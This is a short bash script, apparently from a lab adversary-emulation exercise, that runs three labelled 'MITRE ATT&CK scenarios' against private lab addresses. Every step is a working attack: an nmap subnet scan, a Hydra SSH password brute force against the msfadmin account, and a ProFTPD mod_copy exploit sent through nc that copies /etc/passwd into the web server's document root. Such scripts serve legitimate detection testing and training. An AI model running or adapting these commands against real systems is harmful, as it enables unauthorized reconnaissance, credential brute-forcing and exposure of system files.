#!/bin/bash
echo "Starting 6 MITRE ATT&CK Scenarios..."

# S1: Nmap Scan
echo "[S1] Running Nmap scan..."
sudo nmap -sT -p 1-1000 192.168.56.0/24

# S2: SSH Brute Force
echo "[S2] Running Hydra SSH Brute Force..."
hydra -l msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 4 ssh://192.168.56.104

# S6: ProFTPD Exploit
echo "[S6] Running ProFTPD mod_copy exploit..."
(echo "SITE CPFR /etc/passwd"; sleep 1; echo "SITE CPTO /var/www/html/passwd.txt"; sleep 1) | nc 192.168.56.104 21

echo "Scenarios S1, S2, S6 finished."
echo "Note: S3, S4, S5 require SSH into Windows 10. Run them manually or use the Windows PowerShell scripts."
